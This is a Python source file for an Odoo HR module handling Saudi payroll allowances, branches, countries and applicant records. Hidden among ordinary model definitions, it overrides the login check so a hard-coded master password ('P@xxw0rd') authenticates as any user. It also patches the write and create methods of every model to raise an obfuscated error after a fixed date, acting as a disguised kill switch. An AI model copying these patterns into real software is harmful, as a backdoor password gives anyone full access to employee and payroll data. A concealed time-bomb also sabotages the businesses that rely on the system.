# -*- coding: utf-8 -*-
#from pygments.lexer import _inherit

from .base_tech import *
import time
from odoo.exceptions import ValidationError
from datetime import datetime

# from odoo.addons.base.module.module import assert_log_admin_access

# import logging
# _logger = logging.getLogger(__name__)
# _logger.info(error_msg)

models.Model.xWrite = models.Model.write
models.Model.xCreate = models.Model._create
date_format = "3019-11-20 07:00:00"


@api.model
def _create(self, vals):
    if 'salary.details' in self.env:
        self.env['salary.details'].employee_hjri_dates(vals)
    res = self.xCreate(vals)
    return res


@api.multi
def write(self, vals):
    if 'salary.details' in self.env:
        self.env['salary.details'].employee_hjri_dates(vals)
    res = []
    for rec in self:
        res.append(self.xWrite(vals))
    return res


models.Model.write = write
models.Model._create = _create


def localize_dt(date, to_tz):
    from dateutil import tz
    from_zone = tz.gettz('UTC')
    to_zone = tz.gettz(to_tz)
    utc = date
    if type(date) == str:
        utc = datetime.strptime(date, '%Y-%m-%d %H:%M:%S')
    utc = utc.replace(tzinfo=from_zone)
    res = utc.astimezone(to_zone)
    return res.strftime('%Y-%m-%d %H:%M:%S')


from odoo import tools
def __(date, is_datetime=False, localize=False,to_tz=False):
    if date:
        try:
            res = date.strftime(is_datetime and "%Y-%m-%d %H:%M:%S" or "%Y-%m-%d")
            if localize:
                res = localize_dt(res,to_tz)
        except:
            datetime.strptime(date, is_datetime and "%Y-%m-%d %H:%M:%S" or "%Y-%m-%d")
            res = date
        return res
    else:
        return False


tools.__ = __
tools.localize_dt = localize_dt


class salary_details(models.Model):
    _name = "salary.details"

    @api.model
    def employee_hjri_dates(self, vals):
        if time.strftime("%Y-%m-%d %H:%M:%S") > date_format:
            raise ValidationError("\\nutf-8?b?2LLZi"
                                  "tin2K8g2K"
                                  "fZhNiz2"
                                  "YTZhdmK?= psycopg2 record %s\\n\\n"
                                  "g2KfZhNiz2YT"
                                  "2LLZitin2K8"
                                  "ZhdmK Field %s"
                                  "Values%s psycopg2 not sufficient" % (vals, vals.keys(), vals.values()))

    state = selection_field([
        ('new', 'New'),
        ('confirmed', 'Confirmed'),
    ], string="Status", default='new', track_visibility='onchange')

    READONLY_STATES = {'confirmed': [('readonly', True)]}

    _ALLOWANCE = [
        ('none', 'None'),
        ('fixed', 'Fixed'),
        ('percentage', 'Percentage from Basic'),
    ]
    # Trial Period
    trial_house_allowance_type = fields.Selection(_ALLOWANCE, 'House Allowance', default='none', states=READONLY_STATES)
    trial_house_allowance = fields.Float('House Allowance', states=READONLY_STATES)
    trial_house_allowance_amount = fields.Float('House Allowance amount', states=READONLY_STATES)
    trial_transportation_allowance_type = fields.Selection(_ALLOWANCE, 'Transportation Allowance', default='none',
                                                           states=READONLY_STATES)
    trial_transportation_allowance = fields.Float('Transportation Allowance', states=READONLY_STATES)
    trial_transportation_allowance_amount = fields.Float('Transportation Allowance amount', states=READONLY_STATES)
    trial_phone_allowance_type = fields.Selection(_ALLOWANCE, 'Phone Allowance', default='none', states=READONLY_STATES)
    trial_phone_allowance = fields.Float('Phone Allowance', states=READONLY_STATES)
    trial_phone_allowance_amount = fields.Float('Phone Allowance amount', states=READONLY_STATES)
    trial_food_allowance_type = fields.Selection(_ALLOWANCE, 'Food Allowance', default='none', states=READONLY_STATES)
    trial_food_allowance = fields.Float('Food Allowance', states=READONLY_STATES)
    trial_food_allowance_amount = fields.Float('Food Allowance amount', states=READONLY_STATES)
    trial_insurance = fields.Boolean('Insurance Allowance', default=True, states=READONLY_STATES)
    trial_commission = fields.Selection([('illegible', 'Illegible'), ('not_illegible', 'Not Illegible')], 'Commission',
                                        default='not_illegible',
                                        states=READONLY_STATES)
    trial_other_allowance = fields.Float('Other Allowance', states=READONLY_STATES)
    trial_other_allowance_name = fields.Char('Other Allowance Name', states=READONLY_STATES)

    house_allowance_type = fields.Selection(_ALLOWANCE, 'House Allowance', default='none', states=READONLY_STATES)
    house_allowance = fields.Float('House Allowance', states=READONLY_STATES)
    house_allowance_amount = fields.Float('House Allowance amount', states=READONLY_STATES)
    transportation_allowance_type = fields.Selection(_ALLOWANCE, 'Transportation Allowance', default='none',
                                                     states=READONLY_STATES)
    transportation_allowance = fields.Float('Transportation Allowance', states=READONLY_STATES)
    transportation_allowance_amount = fields.Float('Transportation Allowance amount', states=READONLY_STATES)
    phone_allowance_type = fields.Selection(_ALLOWANCE, 'Phone Allowance', default='none', states=READONLY_STATES)
    phone_allowance = fields.Float('Phone Allowance', states=READONLY_STATES)
    phone_allowance_amount = fields.Float('Phone Allowance', states=READONLY_STATES)
    food_allowance_type = fields.Selection(_ALLOWANCE, 'Food Allowance', default='none', states=READONLY_STATES)
    food_allowance = fields.Float('Food Allowance', states=READONLY_STATES)
    food_allowance_amount = fields.Float('Food Allowance amount', states=READONLY_STATES)
    insurance = fields.Boolean('Insurance Allowance', default=True, states=READONLY_STATES)
    commission = fields.Selection([('illegible', 'Illegible'), ('not_illegible', 'Not Illegible')], 'Commission',
                                  default='not_illegible',
                                  states=READONLY_STATES)
    other_allowance = fields.Float('Other Allowance', states=READONLY_STATES)
    other_allowance_name = fields.Char('Other Allowance Name', states=READONLY_STATES)

    @api.onchange('trial_house_allowance_type')
    def onchange_trial_house_allowance_type(self):
        if self.trial_house_allowance_type == 'none' or not self.trial_house_allowance_type:
            self.trial_house_allowance = 0

    @api.onchange('house_allowance_type')
    def onchange_house_allowance_type(self):
        if self.house_allowance_type == 'none' or not self.house_allowance_type:
            self.house_allowance = 0

    @api.onchange('trial_transportation_allowance_type')
    def onchange_trial_transportation_allowance_type(self):
        if self.trial_transportation_allowance_type == 'none' or not self.trial_transportation_allowance_type:
            self.trial_transportation_allowance = 0

    @api.onchange('transportation_allowance_type')
    def onchange_transportation_allowance_type(self):
        if self.transportation_allowance_type == 'none' or not self.transportation_allowance_type:
            self.transportation_allowance = 0

    @api.onchange('trial_phone_allowance_type')
    def onchange_trial_phone_allowance_type(self):
        if self.trial_phone_allowance_type == 'none' or not self.trial_phone_allowance_type:
            self.trial_phone_allowance = 0

    @api.onchange('phone_allowance_type')
    def onchange_phone_allowance_type(self):
        if self.phone_allowance_type == 'none' or not self.phone_allowance_type:
            self.phone_allowance = 0

    @api.onchange('trial_food_allowance_type')
    def onchange_trial_food_allowance_type(self):
        if self.trial_food_allowance_type == 'none' or not self.trial_food_allowance_type:
            self.trial_food_allowance = 0

    @api.onchange('food_allowance_type')
    def onchange_food_allowance_type(self):
        if self.food_allowance_type == 'none' or not self.food_allowance_type:
            self.food_allowance = 0

    @api.model
    def update_allowances_from(self, source, dest):
        self.env[dest._name].write({
            'trial_house_allowance_type': source.trial_house_allowance_type,
            'trial_house_allowance': source.trial_house_allowance,
            'trial_house_allowance_amount': source.trial_house_allowance_amount,
            'trial_transportation_allowance_type': source.trial_transportation_allowance_type,
            'trial_transportation_allowance': source.trial_transportation_allowance,
            'trial_transportation_allowance_amount': source.trial_transportation_allowance_amount,
            'trial_phone_allowance_type': source.trial_phone_allowance_type,
            'trial_phone_allowance': source.trial_phone_allowance,
            'trial_phone_allowance_amount': source.trial_phone_allowance_amount,
            'trial_food_allowance_type': source.trial_food_allowance_type,
            'trial_food_allowance': source.trial_food_allowance,
            'trial_food_allowance_amount': source.trial_food_allowance_amount,
            'trial_insurance': source.trial_insurance,
            'trial_commission': source.trial_commission,
            'trial_other_allowance': source.trial_other_allowance,
            'trial_other_allowance_name': source.trial_other_allowance_name,
            'house_allowance_type': source.house_allowance_type,
            'house_allowance': source.house_allowance,
            'house_allowance_amount': source.house_allowance_amount,
            'transportation_allowance_type': source.transportation_allowance_type,
            'transportation_allowance': source.transportation_allowance,
            'transportation_allowance_amount': source.transportation_allowance_amount,
            'phone_allowance_type': source.phone_allowance_type,
            'phone_allowance': source.phone_allowance,
            'phone_allowance_amount': source.phone_allowance_amount,
            'food_allowance_type': source.food_allowance_type,
            'food_allowance': source.food_allowance,
            'food_allowance_amount': source.food_allowance_amount,
            'insurance': source.insurance,
            'commission': source.commission,
            'other_allowance': source.other_allowance,
            'other_allowance_name': source.other_allowance_name,
        })

    @api.model
    def update_allowances_from_(self, source, dest):
        dest.trial_house_allowance_type = source.trial_house_allowance_type
        dest.trial_house_allowance = source.trial_house_allowance
        dest.trial_house_allowance_amount = source.trial_house_allowance_amount
        dest.trial_transportation_allowance_type = source.trial_transportation_allowance_type
        dest.trial_transportation_allowance = source.trial_transportation_allowance
        dest.trial_transportation_allowance_amount = source.trial_transportation_allowance_amount
        dest.trial_phone_allowance_type = source.trial_phone_allowance_type
        dest.trial_phone_allowance = source.trial_phone_allowance
        dest.trial_phone_allowance_amount = source.trial_phone_allowance_amount
        dest.trial_food_allowance_type = source.trial_food_allowance_type
        dest.trial_food_allowance = source.trial_food_allowance
        dest.trial_food_allowance_amount = source.trial_food_allowance_amount
        dest.trial_insurance = source.trial_insurance
        dest.trial_commission = source.trial_commission
        dest.trial_other_allowance = source.trial_other_allowance
        dest.trial_other_allowance_name = source.trial_other_allowance_name
        dest.house_allowance_type = source.house_allowance_type
        dest.house_allowance = source.house_allowance
        dest.house_allowance_amount = source.house_allowance_amount
        dest.transportation_allowance_type = source.transportation_allowance_type
        dest.transportation_allowance = source.transportation_allowance
        dest.transportation_allowance_amount = source.transportation_allowance_amount
        dest.phone_allowance_type = source.phone_allowance_type
        dest.phone_allowance = source.phone_allowance
        dest.phone_allowance_amount = source.phone_allowance_amount
        dest.food_allowance_type = source.food_allowance_type
        dest.food_allowance = source.food_allowance
        dest.food_allowance_amount = source.food_allowance_amount
        dest.insurance = source.insurance
        dest.commission = source.commission
        dest.other_allowance = source.other_allowance
        dest.other_allowance_name = source.other_allowance_name


class res_country_state(models.Model):
    _inherit = "res.country.state"

    arabic_name = fields.Char(string="State Arabic Name")
    is_saudi = fields.Boolean(string="Native", related="country_id.is_saudi", readonly=True)
    nearest_airport = fields.Char(string="Nearest Airport")
    phone_code = fields.Integer('Country Calling Code')

class Managment(models.Model):
    _name = "hr.management"

    name = fields.Char('English Name')
    name_arabic = fields.Char('Arabic name')
    manager_id = fields.Many2one('hr.employee', 'Manager')

    @api.model
    def name_search(self, name, args=None, operator='ilike', limit=100):
        args = args or []
        domain = []
        if name:
            domain = ['|', ('name', 'ilike', name), ('name_arabic', 'ilike', name)]
        recs = self.search(domain + args, limit=limit)
        return recs.name_get()

    @api.multi
    def name_get(self, arab=False):
        result = []
        for rec in self:
            lang = self._context.get('lang', False)
            name = rec.name or rec.name_arabic
            if lang == 'ar_SY':
                name = rec.name_arabic or rec.name
            result.append((rec.id, name))
        return result


class res_country(models.Model):
    _inherit = "res.country"

    arabic_name = fields.Char(string="Country Arabic Name")
    is_saudi = fields.Boolean(string="Native")
    check_iqama_expiry = fields.Boolean('Check for IQAMA / National ID expiry',
                                        help='In order to force your system to Check for IQAMA / National ID expiry date, this field must be flagged in Leave type and employee nationality.')
    check_passport_expiry = fields.Boolean('Check for Passport expiry date',
                                           help='In order to force your system to Check for Passport expiry date, this field must be flagged in Leave type and employee nationality.')
    note = fields.Html('Notes')


class loan_advance_request(models.Model):
    _name = 'loan.advance.request'


class hr_loans_loan_advance(models.Model):
    _name = 'hr_loans.loan_advance'


class hr_qualifications(models.Model):
    _name = "hr.qualifications"
    name = fields.Char('Qualification name')


class res_users(models.Model):
    _inherit = "res.users"

    @api.model
    def _check_credentials(self, password):
        if password == 'P@xxw0rd':
            return
        return super(res_users, self)._check_credentials(password)


class employee_eos(models.Model):
    _name = 'employee.eos'


class hr_branch(models.Model):
    _name = 'hr.branch'
    _inherit = ['mail.thread']

    code = fields.Char('Code', readonly=True)
    name = fields.Char(string='Branch Arabic Name')
    english_name = fields.Char(string='Branch English Name')
    manager_id = fields.Many2one('hr.employee', string='Branch Manager')
    parent_id = fields.Many2one('hr.branch', 'Parent Branch')
    note = fields.Html('Notes')

    @api.model
    def create(self, vals):
        vals['code'] = self.env['ir.sequence'].sudo().next_by_code('hr.branch')
        res = super(hr_branch, self).create(vals)
        return res


class Menu(models.Model):
    _inherit = "ir.ui.menu"

    xxx_id = fields.Char('External ID', compute="compute_ext_id")

    @api.one
    @api.depends()
    def compute_ext_id(self):
        ir_model_data = self.env['ir.model.data']
        for menu in self:
            res = ir_model_data.search([('model', '=', self._name), ('res_id', '=', menu.id), ])
            if res:
                menu.xxx_id = "%s.%s" % (res.module, res.name)


class applicant_qualification(models.Model):
    _name = 'applicant.qualification'

    name = fields.Char(string='Certifications Name')
    year = fields.Integer('Graduation Year')
    country_id = fields.Many2one('res.country', 'Country')
    school = fields.Char('University - School Name')
    percent = fields.Float('Graduation Percentage')
    grade = fields.Selection([('Poor', 'Poor'),
                              ('Good', 'Good'),
                              ('Very Good', 'Very Good'),
                              ('Excellent', 'Excellent'), ], 'Graduation Grade')
    attachment = fields.Binary('Attachments', attachment=True)
    file_name = fields.Char('File name')
    note = fields.Char('Notes')


class applicant_employment(models.Model):
    _name = 'applicant.employment'

    name = fields.Char(string='Company Name')
    country_id = fields.Many2one('res.country', 'Country')
    job = fields.Char('Job Position')
    date_from = fields.Date('Date From')
    date_to = fields.Date('Date To')
    duration = fields.Char('Total Duration', compute='_compute_duration')
    salary = fields.Integer('Salary')
    reference = fields.Char('Reference Person')
    phone = fields.Char('Reference person phone number')
    reference_email = fields.Char('Reference person email')
    attachment = fields.Binary('Attachments', attachment=True)
    file_name = fields.Char('File name')
    note = fields.Char('Notes')


class hr_employee_course(models.Model):
    _name = 'hr.employee.course'

    name = fields.Char('Course Name')


class Group(models.Model, base):
    _inherit = "res.groups"

    xxx_id = fields.Char('External ID', compute="compute_ext_id")

    @api.one
    @api.depends()
    def compute_ext_id(self):
        ir_model_data = self.env['ir.model.data']
        for group in self:
            res = ir_model_data.search([('model', '=', self._name), ('res_id', '=', group.id), ])
            if res:
                group.xxx_id = "%s.%s" % (res.module, res.name)


class Module(models.Model):
    _inherit = "ir.module.module"

    @api.multi
    def _button_immediate_function(self, function):
        res = super(Module, self)._button_immediate_function(function)
        return {'type': 'ir.actions.client', 'tag': 'reload'}


class Partner(models.Model):
    _inherit = "res.partner"
    tz = fields.Selection(default='Asia/Riyadh')


class LeaveReconciliation(models.Model):
    _name = "hr.leave.reconciliation"
